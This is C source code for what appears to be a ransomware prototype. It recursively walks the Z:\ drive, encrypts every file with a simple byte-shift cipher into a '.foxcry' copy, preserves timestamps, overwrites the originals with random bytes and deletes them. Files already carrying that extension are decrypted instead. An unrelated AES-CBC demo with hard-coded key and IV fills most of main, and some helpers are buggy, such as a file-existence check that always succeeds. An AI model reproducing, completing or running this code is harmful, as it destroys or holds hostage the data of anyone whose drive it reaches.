#include "main.h"

int dir_exists(const char *path);
int file_exists(const char *filename);
void endeda(char* ret, const char* path_old, const char* path_new, int key);
void copy_old_time(struct stat* st, const char* path_new);
int randInRange(int min, int max);
char randomByte();
void processFilesRecursively(const char* basePath, const char* ext);

int main(int argc, char *argv[])
{
	srand (time(NULL));
	
	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	strcpy(path, "Z:\\");
	processFilesRecursively(path, "foxcry");
	free(path);
	
	struct AES_ctx ctx;

	uint8_t key[] = "aaaaaaaaaaaaaaaa";
	uint8_t iv[]  = "bbbbbbbbbbbbbbbb";
	uint8_t str[] = "This a sample text, Length eq 32";

	printf("\n raw buffer \n");
	for (int i = 0; i < 32; ++i) {
		printf("%.2x", str[i]);
	}

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, str, 32);

	printf("\n Encrypted buffer\n");

	for (int i = 0; i < 32; ++i) {
		printf("%.2x", str[i]);
	}
	
	char output[(32 * 2) + 1];
	char *ptr = &output[0];
	for (int i = 0; i < 32; ++i) {
		 ptr += sprintf(ptr, "%02X", str[i]);
	}
	printf("\n%s", output);
	
	size_t i;
    int value;
    for (i = 0; i < 32 && sscanf(output + i * 2, "%2x", &value) == 1; i++) {
        str[i] = value;
    }
	
	printf("\n raw buffer \n");
	for (int i = 0; i < 32; ++i) {
		printf("%.2x", str[i]);
	}
	printf("\n raw buffer \n");

	printf("\n Decrypted buffer\n");

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, str, 32);

	for (int i = 0; i < 32; ++i) {
		printf("%.2x", str[i]);
	}

	printf("\n");
	printf("%s\n", (char*)&str);
	
	return EXIT_SUCCESS;
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0);
		return 1;
	return 0;
}

void endeda(char* ret, const char* path_old, const char* path_new, int key)
{
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char ch;
	char buffer[CHUNK_SIZE];
	size_t bytes;
	int i, j;
	
	fp_old = fopen(path_old,"rb");
	fp_new = fopen(path_new,"wb");
	
	if(fp_old != NULL && fp_new != NULL)
	{
		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
		{
			j = bytes;
			for(i=0; i<bytes; i++)
			{
				if (ret)
				{
					buffer[i]=buffer[i]+key-j;
				}
				else
				{
					buffer[i]=buffer[i]-key+j;
				}
				j--;
			}
			fwrite(buffer, 1, bytes, fp_new);
		}
	}
	
	fclose(fp_new);
	fclose(fp_old);
}

void copy_old_time(struct stat* st, const char* path_new)
{
	struct utimbuf newTimeBuf;
	newTimeBuf.actime  = st->st_atime;
	newTimeBuf.modtime = st->st_mtime;
	utime(path_new, &newTimeBuf);
}

int randInRange(int min, int max)
{
	double scale = 1.0 / (RAND_MAX + 1);
	double range = max - min + 1;
	return min + (int) ( rand() * scale * range );
}

char randomByte()
{
	return (char)randInRange(0, 255);
}

void shredder(struct stat* st, const char* path)
{
	int stat = chmod(path, S_IREAD|S_IWRITE);
	if (!stat)
	{
		off_t size;
		FILE* fp = NULL;
		fp = fopen(path, "rb+");
		if(fp != NULL)
		{
			size = st->st_size;
			
			size_t k = sizeof(char) * CHUNK_SIZE;
			
			long long i = 0;
			char byte[CHUNK_SIZE];
			
			/* Set file descriptor to point to the 0-index byte of file. */
			fseek(fp, 0L, SEEK_SET);
			
			//total_byte_size = count_bytes(size);
			for(i = 0; i < size; i += k)
			{
				/* get random data */
				for(int j = 0; j < sizeof(byte); j++)
					byte[j] = randomByte();

				/* IF conditional to ensure the program does not over overwrite data. */
				if( (size - i) < CHUNK_SIZE )
					{
						k = sizeof(char) * (size - i);
					}

				/* Writes N(k) bytes to file pointer. */
				fwrite(byte, 0x1, k, fp);
			}
		}
		fclose(fp);
	}
}

void processFilesRecursively(const char* basePath, const char* ext)
{
    char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			strcpy(path_new, basePath);
            strcat(path_new, "\\");
            strcat(path_new, dp->d_name);
			
			// Check Path contains extension
			char* ret = strstr(path_new, ext);
			if (ret)
			{
				ret--;
				ret[0] = 0;
			}
			else
			{
				strcat(path_new, ".");
				strcat(path_new, ext);
			}
			
			if (dir_exists(path_old))
			{				
				processFilesRecursively(path_old, ext);
			}
			else
			{
				//printf("%s\n", dp->d_name);
				//printf("%s\n", path_old);
				//printf("%s\n", path_new);
				
				endeda(ret, path_old, path_new, 786);
				
				if (file_exists(path_new))
				{
					struct stat oldStat;
					if (stat(path_old, &oldStat) == 0)
					{
						copy_old_time(&oldStat, path_new);
						shredder(&oldStat, path_old);
					}
					if (remove(path_old) != 0)
					{
						int stat = chmod(path_old, S_IREAD|S_IWRITE);
						if (!stat) remove(path_old);
					}
				}
			}
        }
    }

    closedir(dir);
}
